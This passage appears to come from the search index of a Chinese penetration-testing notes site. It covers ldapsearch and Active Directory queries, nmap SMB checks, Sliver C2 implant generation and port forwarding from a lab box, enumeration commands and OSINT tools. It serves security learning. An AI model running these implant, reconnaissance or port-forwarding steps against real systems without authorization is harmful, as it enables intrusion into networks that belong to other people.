\u3010\u5bc6\u7801-\u76f4\u63a5\u6307\u5b9a\u3011\u7c21\u6613\u8a8d\u8a3c\u306e\u305f\u3081\u306e\u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u6307\u5b9a\uff08\u4e0e <code>-W</code> 2\u90091\uff09 -y \u4f7f\u7528\u5bc6\u7801\u6587\u4ef6\u3002\u5b9e\u8df5\u4e2d\u6709\u4e0d\u751f\u6548\u7684\u65f6\u5019\u3002\u4ee3\u66ff\u65b9\u6848\uff1a\u53ef\u4ee5\u7528 <code>cat</code> \u5b50\u547d\u4ee4\u4f20\u9012\u6587\u4ef6\u5185\u5bb9\u7b49\u3002 -L \u691c\u7d22\u7d50\u679c\u3092 LDAP \u30c7\u30fc\u30bf\u4ea4\u63db\u30d5\u30a9\u30fc\u30de\u30c3\u30c8(LDIF) \u3067\u8868\u793a\u3059\u308b -LL \u30b3\u30e1\u30f3\u30c8\u30a2\u30a6\u30c8\u884c\u3092\u51fa\u529b\u3057\u306a\u3044 -LLL LDIF \u30d0\u30fc\u30b8\u30e7\u30f3\u3092\u51fa\u529b\u3057\u306a\u3044 -t write binary values to files in temporary directory -o output\u6587\u4ef6\u540d <ul> <li>LDIF\uff08LDAP \u6570\u636e\u4ea4\u6362\u683c\u5f0f\uff09\u5c06\u76ee\u5f55\u5185\u5bb9\u5b9a\u4e49\u4e3a\u4e00\u7ec4\u8bb0\u5f55\u3002\u5b83\u8fd8\u53ef\u4ee5\u8868\u793a\u66f4\u65b0\u8bf7\u6c42\uff08\u6dfb\u52a0\u3001\u4fee\u6539\u3001\u5220\u9664\u3001\u91cd\u547d\u540d\uff09<ul> <li>\u51e0\u4e2aL\u6ca1\u592a\u5927\u5dee\u522b\u3002\u53ef\u4ee5\u76f4\u63a5 <code>-LLL</code>\u3002</li> </ul> </li> </ul>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/ldapsearch/#rootdse","title":"RootDSE","text":"<pre><code># RootDSE\nldapsearch -h ldap-srv -p port -s base -b \"\" objectclass=\"*\"\n\n# \u5982\u679c\u53ea\u60f3\u83b7\u53d6\u57df\u540d\u4fe1\u606f\uff0c\u7ecf\u8fc7\u5b9e\u8df5\u53ef\u7b80\u5316\u4e3a\uff1a\nldapsearch -x -H ldap://&lt;ldap-srv&gt; -s base namingcontexts\n</code></pre>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/ldapsearch/#ldap","title":"LDAP\u8fc7\u6ee4\u5668","text":"<ul> <li>\u57fa\u7840\uff1awin32/adsi/search-filter-syntax</li> <li>\u5e94\u7528\u5b9e\u4f8b\uff1a<ul> <li>active-directory-ldap-syntax-filters.aspx</li> <li>an-introduction-to-manual-active-directory-queryingwith-dsquery-and-ldapsearch</li> </ul> </li> <li>\u6709\u7528\u96c6\u5408\uff1auseful-ldap-queries-for-windows-active-directory-pentesting/<ul> <li><code>ldapsearch \"(&amp;(objectClass=user)(memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=J,DC=DS,DC=NIC,DC=COM))\" *,ntsecuritydescriptor -1 ad.j.ds.nic.com</code></li> </ul> </li> </ul>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/ldapsearch/#_4","title":"\u8bed\u6cd5","text":"<p>LDAP \u8fc7\u6ee4\u5668\u5177\u6709\u4e00\u4e2a\u6216\u591a\u4e2a\u5b50\u53e5\uff0c\u6bcf\u4e2a\u5b50\u53e5\u90fd\u7528\u62ec\u53f7\u62ec\u8d77\u6765\u3002\u6bcf\u4e2a\u5b50\u53e5\u7684\u8ba1\u7b97\u7ed3\u679c\u4e3a True \u6216 False\u3002 LDAP \u8bed\u6cd5\u8fc7\u6ee4\u5b50\u53e5\u91c7\u7528\u8be5\u5f62\u5f0f\uff1a<code>(&lt;AD Attribute&gt;&lt;comparison operator&gt;&lt;value&gt;)</code></p> <ul> <li><code>AD Attribute</code>\uff1a\u5373AD\u5c5e\u6027</li> <li><code>comparison operator</code>\uff08\u4e0d\u652f\u6301\u4ec5\u7528\"&gt;\"\u548c\"&lt;\"\uff09<ul> <li>=\uff1aEquality</li> <li> <p>=\uff1aGreater than or equal to (lexicographical)</p> </li> <li>&lt;=\uff1aLess than or equal to (lexicographical)</li> </ul> </li> <li><code>value</code><ul> <li>\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff08not case sensitive\uff09</li> <li>\u4e14\u4e0d\u5e94\u52a0\u5f15\u53f7\uff01\uff01</li> <li>\u5141\u8bb8\u901a\u914d\u7b26\uff0c\u9664\u4e86DN\u5c5e\u6027<ul> <li>\u4f7f\u7528\u901a\u914d\u7b26\u7684\u53e6\u4e00\u4e2a\u597d\u5904\u662f\u60a8\u53ef\u4ee5\u4f7f\u7528\u90e8\u5206\u5355\u8bcd\u6765\u6a21\u7cca\u60a8\u8981\u67e5\u627e\u7684\u5185\u5bb9\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u641c\u7d22 <code>*sword*</code> \u6216 <code>*minis*</code> \uff0c\u800c\u4e0d\u662f\u641c\u7d22 <code>password</code> \u6216 <code>administrator</code> \u3002</li> </ul> </li> <li>DN\u5c5e\u6027\u53ea\u80fd\u7528\u7b49\u53f7\u8fd0\u7b97\u7b26\uff0c\u4e0d\u5e94\u5c06DN\u503c\u653e\u5728\u62ec\u53f7\u4e2d</li> </ul> </li> </ul>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/ldapsearch/#_5","title":"\u5e03\u5c14\u8fd0\u7b97\u7b26","text":"<ul> <li>&amp;</li> <li>|</li> <li>!</li> </ul>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/ldapsearch/#5ascii","title":"5\u4e2a\u7279\u6b8a\u5b57\u7b26\uff08\u9700\u8981\u201c\u53cd\u659c\u6760+\u4e24\u4e2a\u5b57\u7b26\u7684ASCII \u5341\u516d\u8fdb\u5236\u8868\u793a\u201d\u8f6c\u8bd1\uff09","text":"<ul> <li><code>*</code>\uff1a<code>\\2A</code></li> <li><code>(</code>\uff1a<code>\\28</code></li> <li><code>)</code>\uff1a<code>\\29</code></li> <li><code>\\</code>\uff1a<code>\\5C</code></li> <li><code>Nul</code>\uff1a<code>\\00</code></li> </ul>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/ldapsearch/#_6","title":"\u8e29\u5751","text":"<p>\u7528 <code>\u57df\\\u8d26\u6237</code> \u65f6\u62a5\u9519\uff1a <pre><code>ldap_bind: Invalid credentials (49)\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 additional info: 80090308: LdapErr: DSID-0C090436, comment: AcceptSecurityContext error, data 52e, v23f0\n</code></pre></p> <p>\u89e3\u51b3\uff1a \u7528 <code>\u8d26\u6237@\u57df</code> \u7684\u5f62\u5f0f\u3002</p>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/ldapsearch/#_7","title":"\u53c2\u8003\u8d44\u6599","text":"<p>https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/</p>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/metasploit/","title":"Metasploit","text":""},{"location":"arsenal/metasploit/#_1","title":"\u77e5\u8bc6\u7c7b","text":""},{"location":"arsenal/metasploit/#6","title":"6\u5927\u6838\u5fc3\u6a21\u5757","text":""},{"location":"arsenal/metasploit/#_2","title":"\u5b9e\u8df5\u7c7b","text":""},{"location":"arsenal/metasploit/#_3","title":"\u4e3b\u8981\u547d\u4ee4","text":""},{"location":"arsenal/metasploit/#_4","title":"\u6e17\u900f\u6d41\u7a0b\u4f8b\u5b50","text":""},{"location":"arsenal/nmap/","title":"nmap","text":"","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/nmap/#_1","title":"\u6982\u8981","text":"","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/nmap/#_2","title":"\u8be6\u7ec6","text":"","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/nmap/#ref","title":"REF","text":"<ul> <li>Ignitetechnologies - Nmap for Pentester</li> </ul>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/nmap/#nse","title":"NSE","text":"<p>\u811a\u672c\u4f4d\u7f6e\uff1a<code>/usr/share/nmap/scripts/</code></p>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/nmap/#smb","title":"SMB","text":"","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/nmap/#smb_1","title":"\u786e\u8ba4\u662f\u5426\u9700\u8981SMB\u7b7e\u540d","text":"<p><pre><code>nmap -p 445 --script smb-security-mode,smb2-security-mode taget\n</code></pre> - \u9700\u8981\u7b7e\u540d\uff1amessage_signing\u663e\u793arequired - \u4e0d\u9700\u8981\uff1amessage_signing\u663e\u793a\u663e\u793adisabled\u6216supported</p>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/nmap/#nfs","title":"NFS","text":"<p>-p 111,2049 nfs-ls.nse</p> <p>\u67e5\u770b\u626b\u63cf\u4e86\u54ea\u4e9b\u9ed8\u8ba4\u7aef\u53e3 - <code>-oG -</code>\u5c06 grepable \u683c\u5f0f\u8f93\u51fa\u5230 stdout\u3002 <pre><code>TimeLess613@htb[/htb]$ nmap -v -oG -\n\n# Nmap 7.80 scan initiated Wed Dec 16 23:22:26 2020 as: nmap -v -oG -\n\n# Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30, ... ,65389) UDP(0;) SCTP(0;) PROTOCOLS(0;)\n\nWARNING: No targets were specified, so 0 hosts scanned.\n\n# Nmap done at Wed Dec 16 23:22:26 2020 -- 0 IP addresses (0 hosts up) scanned in 0.04 seconds\n</code></pre></p>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/nmap/#ldap","title":"LDAP","text":"<p>LDAP#RootDSE</p>","tags":["\u6e17\u900f/\u6b66\u5668\u5e93","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"arsenal/sliver-c2/","title":"SliverC2","text":"<p>\u6700\u8fd1\u542c\u8bf4\u4e86\u4e2aSliver C2\u597d\u50cf\u662f\u5bf9\u6807CS\u7684\uff1f</p>"},{"location":"arsenal/sliver-c2/#install","title":"Install","text":"<p>\u5b89\u88c5\u5f88\u7b80\u5355\uff1a </p> <p><code>curl https://sliver.sh/install|sudo bash</code> and then run <code>sliver</code></p> <ul> <li>memo\uff1a\u8fd9\u79cd\u65b9\u5f0f\u5b89\u88c5\u5373\u4e3aMultiplayer Mode<pre><code>The easiest way to setup a server for multiplayer is to use the Linux install script which will configure the server as a systemd service.\n</code></pre> </li> </ul>"},{"location":"arsenal/sliver-c2/#implants-beacon-vs-session","title":"Implants: Beacon vs. Session","text":"<p><code>sliver &gt; generate [beacon] --mtls &lt;yourIP&gt; --os linux [--save \u7edd\u5bf9\u8def\u5f84]</code></p> <ul> <li>\u9ed8\u8ba4\u4fdd\u5b58\u5728\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u2014\u2014\u5373\u6253\u5f00sliver\u65f6\u7684\u76ee\u5f55</li> <li>\u53ef\u7528 <code>implants</code> \u547d\u4ee4\u8fdb\u884c\u7ba1\u7406\uff08\u4f46\u662f\u5176\u5b9e\u6e90\u6587\u4ef6\u8fd8\u662f\u8981\u81ea\u5df1\u624b\u52a8\u5220\uff01\uff09 </li> <li>\u7aef\u53e3\u8f6c\u53d1\u4ec5\u652f\u6301\u4f1a\u8bdd\u6a21\u5f0f<ul> <li>\u5c1d\u8bd5beacon\u6a21\u5f0f\u5f00\u4e34\u65f6\u4f1a\u8bdd\u2014\u2014\u4e34\u65f6\u4f1a\u8bdd\u5173\u6389\u4e4b\u540e\u914d\u7f6e\u7684\u7aef\u53e3\u8f6c\u53d1\u4e5f\u5931\u6548</li> </ul> </li> </ul>"},{"location":"arsenal/sliver-c2/#netstat","title":"netstat\u6ce8\u610f\u70b9","text":"<p>Sliver\u7684 <code>netstat</code> \u547d\u4ee4\u8981\u663e\u793a\u5168\u8fd8\u633a\u9ebb\u70e6\u7684\u2026\u2026\u5982\u679c\u4e0d\u662f\u4e4b\u524d\u77e5\u9053\u5f00\u653e\u4e863000\u30018001\u7b49\u672c\u5730\u7aef\u53e3\u7684\u8bdd\uff0c\u4f30\u8ba1\u5c31\u4e0d\u4f1a\u6ce8\u610f\u5230\u4e86\u3002\u5bf9\u6bd4\u5e26\u9009\u9879\u548c\u4e0d\u5e26\u9009\u9879\uff1a <pre><code>sliver (SMILING_WET-BAR) &gt; netstat -4 -6 -l -n -T -u\n\n Protocol   Local Address     Foreign Address   State         PID/Program Name \n========== ================= ================= ============= ==================\n udp        127.0.0.1:48897   127.0.0.53:53     ESTABLISHED   0/               \n udp        127.0.0.53:53     0.0.0.0:0                       0/               \n udp        0.0.0.0:68        0.0.0.0:0                       0/               \n tcp        127.0.0.1:3306    0.0.0.0:0         LISTEN        0/               \n tcp        0.0.0.0:80        0.0.0.0:0         LISTEN        1049/nginx       \n tcp        127.0.0.53:53     0.0.0.0:0         LISTEN        0/               \n tcp        0.0.0.0:22        0.0.0.0:0         LISTEN        0/               \n tcp        127.0.0.1:3000    0.0.0.0:0         LISTEN        0/               \n tcp        127.0.0.1:8001    0.0.0.0:0         LISTEN        0/               \n tcp        127.0.0.1:33060   0.0.0.0:0         LISTEN        0/               \n tcp6       127.0.0.1:7474    :::0              LISTEN        0/               \n tcp6       :::22             :::0              LISTEN        0/               \n tcp6       127.0.0.1:7687    :::0              LISTEN        0/\n\n\nsliver (SMILING_WET-BAR) &gt; netstat \n\n Protocol   Local Address         Foreign Address    State         PID/Program Name     \n========== ===================== ================== ============= ======================\n tcp        only4you.htb.:48422   10.xx.xx.xx:4444   ESTABLISHED   5111/python3         \n tcp        only4you.htb.:44230   10.xx.xx.xx:4444   CLOSE_WAIT    1438/python3         \n tcp        only4you.htb.:32794   10.xx.xx.xx:4444   CLOSE_WAIT    1250/python3         \n tcp        localhost:3000        localhost:41604    ESTABLISHED   0/                   \n tcp        localhost:3000        localhost:41616    ESTABLISHED   0/                   \n tcp        only4you.htb.:59626   10.xx.xx.xx:4444   CLOSE_WAIT    2215/python3         \n tcp        only4you.htb.:39926   dns.google.:53     SYN_SENT      0/                   \n tcp        localhost:3000        localhost:41624    ESTABLISHED   0/\n</code></pre></p>"},{"location":"arsenal/sliver-c2/#port-forwarding","title":"Port Forwarding","text":"<pre><code>sliver (SMILING_WET-BAR) &gt; portfwd add -b 10.xx.xx.xx:7474 -r 127.0.0.1:7474\n\n[*] Port forwarding 10.xx.xx.xx:7474 -&gt; 127.0.0.1:7474\n\n\nsliver (SMILING_WET-BAR) &gt; portfwd \n\n ID   Session ID                             Bind Address       Remote Address \n==== ====================================== ================== ================\n  1   bd9e189d-515d-43a8-913d-8bf558991ee8   10.xx.xx.xx:3000   127.0.0.1:3000 \n  2   bd9e189d-515d-43a8-913d-8bf558991ee8   10.xx.xx.xx:8001   127.0.0.1:8001 \n  3   bd9e189d-515d-43a8-913d-8bf558991ee8   10.xx.xx.xx:7474   127.0.0.1:7474\n</code></pre>"},{"location":"arsenal/sliver-c2/#socks5-proxy","title":"socks5 proxy","text":"<p>\u4e5f\u53ef\u4ee5 <code>socks start</code> \u5f00\u542fsocks5\u4ee3\u7406\u3002\u7136\u540e\u5728\u6d4f\u89c8\u5668\u914d\u7f6e\u4ee3\u7406\u5c31\u597d\u4e86</p>"},{"location":"arsenal/sqlmap/","title":"sqlmap","text":""},{"location":"arsenal/viper/","title":"Viper","text":""},{"location":"arsenal/viper/#viper","title":"Viper(\u70ab\u5f69\u86c7)","text":"<p>github: https://github.com/FunnyWolf/Viper</p> <p>\u53ef\u7b80\u5355\u7406\u89e3\u4e3a\u56fe\u5f62\u5316msf\u3002\u7136\u540e\u6709\u56e2\u961f\u534f\u4f5c\u3002</p>"},{"location":"arsenal/viper/#_1","title":"\u9996\u6b21\u5b89\u88c5","text":"<ul> <li>\u8ddf\u7740\u5b98\u65b9\u6587\u6863\u5c31\u884c</li> <li>\u4e00\u952e\u5b89\u88c5\u5931\u8d25\u7684\u8bdd\uff0c\u53ef\u4ee5\u4e2d\u9014\u624b\u52a8\u7ee7\u7eed\u914d\u7f6edocker-compose.yml<ul> <li>\u6ce8\u610f\u9632\u706b\u5899\u914d\u7f6e</li> <li>\u53ef\u8c03\u6574\u4e00\u4e0bdocker-compose.yml\u91cc\u7684image\u6e90</li> </ul> </li> <li>\u9996\u6b21\u542f\u52a8\u53ef\u4ee5 <code>docker compose up</code> \u4e0d\u540e\u53f0\u542f\u52a8\u3002\u7531\u4e8epull image\u67091GB\u5de6\u53f3\u3002\u76f4\u63a5\u540e\u53f0\u542f\u52a8\u53ef\u80fd\u7b4915s\u4f9d\u65e7\u65e0\u6cd5\u8bbf\u95ee\u4e5f\u4e0d\u77e5\u9053\u5b9e\u9645\u53d1\u751f\u4e86\u4ec0\u4e48\u95ee\u9898\u3002<ul> <li>\u5f53\u7136\u53ef\u4ee5\u770bdocker\u7684log</li> </ul> </li> </ul>"},{"location":"basic-concepts/basic-concepts/","title":"\u57fa\u7840\u6982\u5ff5","text":""},{"location":"basic-concepts/basic-concepts/#_1","title":"\u57fa\u672c\u6e17\u900f\u6d41\u7a0b\u30fb\u65b9\u6cd5\u8bba","text":"<ol> <li> <p>\u4fe1\u606f\u6536\u96c6\u9636\u6bb5</p> <ul> <li>\u8e29\u70b9</li> <li>\u626b\u63cf</li> <li>\u679a\u4e3e</li> </ul> </li> <li> <p>\uff08\u653b\u51fb\u89c4\u5212/\u6f0f\u6d1e\u5206\u6790\u9636\u6bb5\uff09</p> </li> <li> <p>\u653b\u51fb\u9636\u6bb5</p> <ul> <li>\u521d\u59cb\u8bbf\u95ee</li> <li>\u63d0\u6743</li> </ul> </li> <li> <p>\u540e\u6e17\u900f</p> <ul> <li>\u6743\u9650\u7ef4\u6301</li> <li>\u5185\u7f51\u63a2\u7d22</li> <li>\u75d5\u8ff9\u6e05\u7406</li> <li>\u83b7\u53d6\u6570\u636e/flag</li> </ul> </li> </ol>"},{"location":"basic-concepts/basic-concepts/#ptespenetration-testing-execution-standard","title":"PTES\uff08Penetration Testing Execution Standard\uff0c\u6e17\u900f\u6d4b\u8bd5\u6267\u884c\u6807\u51c6\uff09","text":"<p> <p></p>"},{"location":"information-gathering/enumerate/","title":"\u679a\u4e3e","text":""},{"location":"information-gathering/enumerate/#enumeration-methodology","title":"Enumeration Methodology","text":"<p>https://academy.hackthebox.com/storage/modules/112/enum-method3.png https://academy.hackthebox.com/storage/modules/112/pentest-labyrinth.png</p>"},{"location":"information-gathering/enumerate/#_1","title":"\u5de5\u5177\u96c6","text":"<p>MindMap</p>"},{"location":"information-gathering/enumerate/#protocol","title":"Protocol","text":""},{"location":"information-gathering/enumerate/#netbiosnbns-udp137","title":"NetBIOS\uff08NBNS UDP/137\uff09","text":"<ul> <li><code>nbtstat -a &lt;remote IP&gt;</code> \u83b7\u53d6\u8fdc\u7a0b\u673a\u5668\u7684NetBIOS\u8868</li> <li> <p><code>nbtstat -c</code> \u83b7\u5f97NetBIOS\u8868\u3001\u89e3\u6790cache\u3002</p> <p>It is possible to extract this information without creating a null session (an unauthenticated session).</p> </li> <li> <p><code>net use</code></p> </li> <li><code>nmap --script nbstat.nse</code></li> <li><code>net view \\\\&lt;computer name&gt; [/ALL]</code> \u8fdc\u7a0b\u4e3b\u673a\u6216\u8005\u5de5\u4f5c\u7ec4\u6240\u6709\u7684\u5171\u4eab\u8d44\u6e90\uff08share\uff09\u5217\u8868</li> <li><code>net view /domain:&lt;domain name&gt;</code></li> </ul>"},{"location":"information-gathering/enumerate/#snmp","title":"SNMP","text":""},{"location":"information-gathering/enumerate/#ldaptcp389","title":"LDAP\uff08TCP/389\uff09","text":""},{"location":"information-gathering/enumerate/#ntpudp123","title":"NTP\uff08UDP/123\uff09","text":"<p>\u80fd\u6536\u96c6\u7684\u4fe1\u606f\uff1a</p> <ul> <li>\u8fde\u63a5NTP\u670d\u52a1\u5668\u7684host\u6e05\u5355</li> <li>\u5ba2\u6237\u7aefIP\u3001\u7cfb\u7edf\u540d\u3001OS</li> <li>\u5982\u679cNTP\u670d\u52a1\u5668\u5728DMZ\uff0c\u8fd8\u80fd\u83b7\u5f97\u5185\u90e8IP</li> </ul> <ul> <li><code>ntptrace</code></li> <li><code>ntpdc</code> \u76d1\u89c6ntpd\u7684\u64cd\u4f5c\uff0c\u83b7\u53d6NTP\u670d\u52a1\u5668\u7684\u4fe1\u606f</li> <li><code>ntpq</code> \u76d1\u89c6ntpd\u7684\u64cd\u4f5c\u3001\u6027\u80fd\uff0c\u83b7\u53d6NTP\u670d\u52a1\u5668\u7684\u4fe1\u606f</li> <li>nmap</li> </ul>"},{"location":"information-gathering/enumerate/#nfstcp2049","title":"NFS\uff08TCP/2049\uff09","text":"<p>\u80fd\u6536\u96c6\u7684\u4fe1\u606f\uff1a</p> <ul> <li>\u8fde\u63a5\u4e86NFS\u670d\u52a1\u5668\u7684\u5ba2\u6237\u7aef\u6e05\u5355\u3001IP\u3001\u5171\u4eab\u8d44\u6e90</li> </ul> <ul> <li><code>showmount -e &lt;ip&gt;</code></li> </ul> <p>\u5de5\u5177\uff1a</p> <ul> <li>RDPScan\uff08\u7b80\u5355\u626b\u63cf\uff0ccheck\u5171\u4eab\u914d\u7f6e\u9519\u8bef\uff09</li> <li>SuperEnum\uff08\u6709\u811a\u672c\uff09</li> </ul>"},{"location":"information-gathering/enumerate/#smtptcp25","title":"SMTP\uff08TCP/25\uff09","text":""},{"location":"information-gathering/enumerate/#dns","title":"DNS","text":"<p>\u76ee\u6807\uff1a\u57df\u4f20\u9001\u6709\u6548\u7684DNS</p> <ul> <li><code>nslookup (ls -d &lt;DNS hostname&gt;)</code></li> <li><code>dig</code></li> </ul>"},{"location":"information-gathering/enumerate/#telnet","title":"Telnet","text":""},{"location":"information-gathering/enumerate/#ftptftp","title":"FTP/TFTP","text":""},{"location":"information-gathering/enumerate/#smbovernetbios-tcp139-overtcp-tcp445-cifs","title":"SMB\uff08overNetBIOS TCP/139, overTCP TCP/445 = CIFS\uff09","text":""},{"location":"information-gathering/enumerate/#rpctcpudp111-or-135","title":"RPC\uff08TCP/UDP/111? or 135\uff09","text":""},{"location":"information-gathering/enumerate/#ipv6","title":"IPv6","text":""},{"location":"information-gathering/enumerate/#ipsec","title":"IPsec","text":""},{"location":"information-gathering/enumerate/#voip","title":"VoIP","text":""},{"location":"information-gathering/enumerate/#bgptcp179","title":"BGP\uff08TCP/179\uff09","text":""},{"location":"information-gathering/footprinting/","title":"\u8e29\u70b9","text":""},{"location":"information-gathering/footprinting/#_1","title":"\u7528\u641c\u7d22\u5f15\u64ce","text":"<ul> <li>Google Dork(Google Hacking)<ul> <li>Metagoofil\uff1agoogle dorks\u547d\u4ee4\u884c</li> </ul> </li> <li>shodan</li> <li>censys</li> <li>\u53cd\u5411\u641c\u56fe\uff08reverse image search\uff09<ul> <li>saucenao</li> <li>ascii2d</li> </ul> </li> </ul>"},{"location":"information-gathering/footprinting/#videoimage","title":"Video/Image","text":"<p>https://mattw.io/youtube-metadata/ and press Enter. YouTube Metadata tool collects singular details of a video, its uploader, playlist and its creator or channel. You can use other video search engines such as\u00a0Google videos\u00a0(https://video.google.com),\u00a0Yahoo videos\u00a0(https://video.search.yahoo.com), etc.; video analysis tools such as\u00a0EZGif\u00a0(https://ezgif.com),\u00a0VideoReverser.com, etc.; and reverse image search tools such as\u00a0TinEye Reverse Image Search\u00a0(https://tineye.com),\u00a0Yahoo Image Search\u00a0(https://images.search.yahoo.com), etc. to gather crucial information about the target organization.</p>"},{"location":"information-gathering/footprinting/#web","title":"\u7528Web\u670d\u52a1","text":"<ul> <li>netcraft</li> <li>Sublist3r (https://github.com)</li> <li>Pentest-Tools Find Subdomains (https://pentest-tools.com)</li> </ul>"},{"location":"information-gathering/footprinting/#email","title":"\u4eba/Email","text":"<ul> <li>Email Header</li> <li>theHarvester</li> <li>Social Searcher (https://www.social-searcher.com)</li> </ul> <p>UserRecon\u00a0(https://github.com) Followerwonk\uff08 https://followerwonk.com/analyze\uff09 Hootsuite\u00a0(https://hootsuite.com) Sysomos\u00a0(https://www.sysomos.com)</p> <p>https://www.peekyou.com\u00a0and press\u00a0Enter. If cookie pop-up appears at the lower section of the browser, click\u00a0I agree. pipl\u00a0(https://pipl.com) Intelius\u00a0(https://www.intelius.com) BeenVerified\u00a0(https://www.beenverified.com)</p>"},{"location":"information-gathering/footprinting/#_2","title":"\u6697\u7f51","text":"<ul> <li>TOR</li> </ul>"},{"location":"information-gathering/footprinting/#_3","title":"\u7f51\u7ad9\u8db3\u8ff9","text":"<ul> <li>walk through</li> <li>Web\u6863\u6848\uff1ahttps://archive.org/</li> <li>\u955c\u50cf<ul> <li>HTTrack Web Site Copier</li> </ul> </li> </ul>"},{"location":"information-gathering/footprinting/#_4","title":"\u5de5\u5177","text":"<ul> <li>Recon-ng</li> <li>Maltego</li> <li>\u62a5\u5934\u626b\u63cf\u5668 (https://securityheaders.com)</li> </ul>"},{"location":"information-gathering/information-gathering/","title":"\u7b80\u4ecb","text":"<p>\u4e0d\u5fc5\u7ea0\u7ed3\u4e8e\u6982\u5ff5\u3002</p>"},{"location":"information-gathering/information-gathering/#footprinting","title":"Footprinting\uff08\u8e29\u70b9\uff09","text":"<p>\u76ee\u7684\uff1a\u653b\u51fb\u8005\u4e8b\u5148\u6c47\u96c6\u76ee\u6807\u7684\u4fe1\u606f\uff0c\u786e\u5b9a\u5165\u4fb5\u65b9\u6cd5\u3001\u53d1\u6398\u6f0f\u6d1e</p> <ul> <li>\u4e86\u89e3\u5b89\u5168\u6001\u52bf\u2014\u2014\u6536\u96c6\u7684\u6570\u636e\u5c06\u5e2e\u52a9\u6211\u4eec\u4e86\u89e3\u516c\u53f8\u7684\u5b89\u5168\u6001\u52bf\uff0c\u4f8b\u5982\u6709\u5173\u9632\u706b\u5899\u5b58\u5728\u60c5\u51b5\u3001\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u914d\u7f6e\u7b49\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</li> <li>\u7f29\u5c0f\u653b\u51fb\u533a\u57df\u2014\u2014\u53ef\u4ee5\u8bc6\u522b\u7279\u5b9a\u8303\u56f4\u7684\u7cfb\u7edf\u5e76\u4ec5\u4e13\u6ce8\u4e8e\u7279\u5b9a\u76ee\u6807\u3002\u8fd9\u5c06\u5927\u5927\u51cf\u5c11\u6211\u4eec\u5173\u6ce8\u7684\u7cfb\u7edf\u6570\u91cf\u3002</li> <li>\u8bc6\u522b\u6f0f\u6d1e\u2014\u2014\u6211\u4eec\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e2a\u4fe1\u606f\u6570\u636e\u5e93\uff0c\u5305\u542b\u76ee\u6807\u7ec4\u7ec7\u7cfb\u7edf\u4e2d\u53ef\u7528\u7684\u6f0f\u6d1e\u3001\u5a01\u80c1\u3001\u6f0f\u6d1e\u3002</li> <li>\u7ed8\u5236\u7f51\u7edc\u56fe\u2014\u2014\u5e2e\u52a9\u7ed8\u5236\u76ee\u6807\u7ec4\u7ec7\u4e2d\u7f51\u7edc\u7684\u7f51\u7edc\u56fe\uff0c\u5305\u62ec\u62d3\u6251\u3001\u53ef\u4fe1\u8def\u7531\u5668\u3001\u670d\u52a1\u5668\u7684\u5b58\u5728\u548c\u5176\u4ed6\u4fe1\u606f\u3002</li> </ul>"},{"location":"information-gathering/information-gathering/#3","title":"\u53ef\u6536\u96c63\u4e2a\u65b9\u9762\u7684\u4fe1\u606f","text":"<ul> <li>\u7f51\u7edc\uff1a\u57df\u540d/\u5b50\u57df\u3001\u7f51\u6bb5\u3001IP\u3001whois\u8bb0\u5f55\u3001DNS\uff0c\u6b63\u5728\u8fd0\u884c\u7684IDS\u3001\u670d\u52a1\u3001\u7f51\u7ad9\u3001VPN\u3001ACL\u7b49</li> <li>\u7cfb\u7edf\uff08Host\uff09\uff1aOS\u3001server\u7684\u4f4d\u7f6e\u3001user/pass\u7b49\u3001SNMP\u4fe1\u606f\u7b49</li> 